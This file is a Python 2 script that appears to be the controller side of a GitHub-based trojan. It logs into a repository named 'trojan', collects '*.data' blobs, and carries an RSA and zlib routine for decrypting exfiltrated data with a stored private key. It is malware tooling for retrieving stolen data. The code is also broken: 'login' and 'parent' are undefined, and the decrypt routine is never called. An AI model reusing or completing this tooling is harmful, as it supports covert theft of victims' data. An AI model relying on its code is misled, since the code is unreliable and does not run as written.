#!/usr/bin/python
import os
import zlib
import base64
import fnmatch
import github3

from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from github.MainClass import Github

def decrypt(plaintext, key):
    rsakey = RSA.importKey(key)
    rsakey = PKCS1_OAEP.new(rsakey)
    
    chunk_size = 256
    offset = 0
    decrypted = ""
    encrypted = base64.b64decode(plaintext)
    
    added_chunk = int(encrypted[:4],base=0)
    encrypted = encrypted[4:]
    print "\tDecrypt: %d bytes " % len(encrypted)
    
    while offset < len(encrypted):
        decrypted += rsakey.decrypt(encrypted[offset:offset+chunk_size])
        offset += chunk_size
    
    decrypted = decrypted[:(len(decrypted)-added_chunk)]
    
    print "\tDecompress: %d bytes " % len(decrypted)
    decrypted = zlib.decompress(decrypted)
    print "\tDecompressed: %d bytes " % len(decrypted) 
    return decrypted

def connect_to_github():
    gh = login(username="username", password="password")
    repo = gh.repository("username","trojan")
    branch = repo.branch("master")
    return gh, repo, branch

# !----- Main Loop -----!#
with open("keys/data_key") as file_object: 
    private_key=file_object.read()
    file_object.close()

gh, repo, branch = connect_to_github()
tree = branch.commit.commit.tree.recurse()    
for filenames in tree.tree:
    for filename in fnmatch.filter(filenames,"*.data"):
        print "Found: %s" % filename
        decrypted = repo.blob(filename._json_data['sha'])
                        
        try:
            os.mkdir("data/%s" % parent[-8:])
        except:
            pass
        print "\tSave: data/%s/%s" % (parent[-8:], filename)
        with open("data/%s/%s" % (parent[-8:], filename), 'w') as file_object:
            file_object.write(decrypted)
            file_object.close()
            
            